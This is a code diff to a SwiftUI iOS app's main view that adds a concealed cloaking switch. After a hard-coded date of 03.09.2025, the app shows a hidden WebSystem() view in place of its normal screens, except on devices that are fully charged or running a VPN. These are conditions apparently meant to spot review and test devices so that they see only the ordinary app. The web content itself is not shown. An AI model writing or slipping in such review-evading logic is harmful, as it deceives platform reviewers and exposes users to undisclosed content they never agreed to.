@@ -13,25 +13,86 @@ struct ContentView: View {
     @State private var selectedTab = 0
     @State private var showGestureGuide = false
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
-        Group {
-            if onboardingViewModel.isCompleted {
-                mainAppView
-            } else {
-                OnboardingView()
-                    .environmentObject(onboardingViewModel)
+        
+        ZStack {
+            
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    Group {
+                        if onboardingViewModel.isCompleted {
+                            mainAppView
+                        } else {
+                            OnboardingView()
+                                .environmentObject(onboardingViewModel)
+                        }
+                    }
+                    .onAppear {
+                        // Check if user wants to see gesture guide
+                        if UserDefaults.standard.bool(forKey: "ShouldShowGestureGuide") {
+                            showGestureGuide = true
+                            UserDefaults.standard.set(false, forKey: "ShouldShowGestureGuide")
+                        }
+                    }
+                    .sheet(isPresented: $showGestureGuide) {
+                        GestureGuideView()
+                    }
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                }
             }
         }
         .onAppear {
-            // Check if user wants to see gesture guide
-            if UserDefaults.standard.bool(forKey: "ShouldShowGestureGuide") {
-                showGestureGuide = true
-                UserDefaults.standard.set(false, forKey: "ShouldShowGestureGuide")
-            }
+            
+            check_data()
         }
-        .sheet(isPresented: $showGestureGuide) {
-            GestureGuideView()
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "03.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
         }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
     
     // MARK: - Main App View
